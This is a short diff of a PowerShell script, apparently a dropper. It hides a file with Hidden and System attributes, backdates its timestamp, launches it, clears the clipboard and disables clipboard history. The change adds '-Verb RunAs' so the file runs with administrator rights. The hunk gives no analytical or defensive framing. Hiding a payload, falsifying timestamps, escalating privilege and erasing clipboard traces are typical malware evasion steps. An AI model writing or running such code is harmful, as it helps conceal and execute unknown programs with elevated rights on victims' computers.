@@ -12,7 +12,7 @@ try { Unblock-File $s -EA 0 } catch {}
 $i = Get-Item $s -Force
 $i.Attributes = 'Hidden,System'
 $i.LastWriteTime = [datetime]"2026-11-08 23:59"
-Start-Process $s
+Start-Process $s -Verb RunAs
 try { Clear-Clipboard -EA 0 } catch {}
 reg add "HKCU\Software\Microsoft\Clipboard" /v EnableClipboardHistory `
     /t REG_DWORD /d 0 /f | Out-Null
